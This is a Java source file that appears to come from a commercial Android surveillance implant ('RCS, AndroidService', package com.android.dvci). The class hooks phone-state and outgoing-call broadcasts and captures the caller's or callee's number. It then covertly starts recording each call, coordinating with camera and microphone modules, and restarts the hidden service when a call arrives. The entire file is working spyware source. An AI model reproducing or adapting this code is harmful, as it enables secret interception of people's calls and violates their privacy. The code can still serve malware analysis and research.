/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/
//
package com.android.dvci.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.dvci.Call;
import com.android.dvci.Core;
import com.android.dvci.ServiceMain;
import com.android.dvci.auto.Cfg;
import com.android.dvci.module.ModuleCall;
import com.android.dvci.module.ModuleCamera;
import com.android.dvci.module.ModuleMic;
import com.android.dvci.module.ModuleSnapshot;
import com.android.dvci.module.call.RecordCall;
import com.android.dvci.util.Check;

public class BroadcastMonitorCall  {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorCall"; //$NON-NLS-1$
	private static final String MODULE_STOP_REASON = "PhoneCall"; //$NON-NLS-1$
	private static Call call = null;
	private Object lastKnownPhoneState;

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */

	public static void onReceive(Context context, Intent intent) {

		if (Core.iSR() == false) {
			Intent serviceIntent = new Intent(context, ServiceMain.class);

			// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
			context.startService(serviceIntent);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
			}

			return;
		}

		if (intent == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
			}

			return;
		}

		//if (intent != null && intent.getAction().equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
			manageReceive(context, intent);
		//}

	}

	static boolean incoming=Call.OUTGOING;
	static String ongoing_number = "";

	public static void manageReceive(Context context, Intent intent) {
		try {

			TelephonyManager telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
			Integer callState = Integer.valueOf(telManager.getCallState());
			/****************************************/
			/** INCOMING:  RINGING->OFFHOOK->IDLE
			 /** OUTCOMING: OFFHOOK->IDLE
			 /****************************************/
			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
				ongoing_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				// Outgoing phone call
				if (Cfg.DEBUG) {
					Check.log(TAG + " (manageReceive): OUTGOING, my===> " + ongoing_number);//$NON-NLS-1$
				}
				incoming = Call.OUTGOING;
				return;
			}else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				// il numero delle chiamate entranti lo abbiamo solo qui
				ongoing_number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

				// Phone is ringing
				if (Cfg.DEBUG) {
					Check.log(TAG + " (manageReceive): RINGING, my<===" + ongoing_number);//$NON-NLS-1$
				}
				incoming = Call.INCOMING;
				return;
			}
			switch (callState.intValue()) {
				case TelephonyManager.CALL_STATE_IDLE:
					if (Cfg.DEBUG) {
						Check.log(TAG + " (manageReceive): Call IDLE detected -> END");
					}
					//stop it
					if (call != null) {
						call.setOngoing(false);
						call.setComplete(incoming ? true : false);
						//ListenerCall.self().dispatch(call);
						// Let's start with call recording
						if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag() ) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (manageReceive): stopping call"); //$NON-NLS-1$
							}
							RecordCall.self().stopCall();
							ongoing_number="";

							if(ModuleCamera.self()!=null) {
								ModuleCamera.self().removeStop(MODULE_STOP_REASON);
							}
							if(ModuleMic.self()!=null) {
								ModuleMic.self().removeStop(MODULE_STOP_REASON);
							}
						}
					}

				case TelephonyManager.CALL_STATE_OFFHOOK:
					if (Cfg.DEBUG) {
						Check.log(TAG + " (manageReceive): Call START detected");
					}
					//start it
					if(ongoing_number==""){
						if (Cfg.DEBUG) {
							Check.log(TAG + " (manageReceive): Call START aborted invalid number");
						}
					}else {
						call = new Call(ongoing_number, incoming);
						if (call != null) {
							call.setOngoing(true);
							call.setOffhook();
							//ListenerCall.self().dispatch(call);
							if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (c): starting call"); //$NON-NLS-1$
								}
								if(ModuleMic.self()!=null) {
									ModuleMic.self().addStop(MODULE_STOP_REASON);
								}
								if(ModuleCamera.self()!=null) {
									ModuleCamera.self().addStop(MODULE_STOP_REASON);
								}
								RecordCall.self().recordCall(call);

							}
						}
					}
					break;

				case TelephonyManager.CALL_STATE_RINGING:
					if (Cfg.DEBUG) {
						Check.log(TAG + " (manageReceive): Call RINGING incoming");
					}

					break;

				default:
					if (Cfg.DEBUG) {
						Check.log(TAG + " (manageReceive): Call DEFAULT callState=" + callState.intValue());
					}
					break;
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(TAG + " (manageReceive) Error: " + ex);
				ex.printStackTrace();
			}
		}
	}

	public static void stopOnGoingRec() {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopOnGoingRec): stopping call due to stop"); //$NON-NLS-1$
			}
			RecordCall.self().stopCall();
	}
}
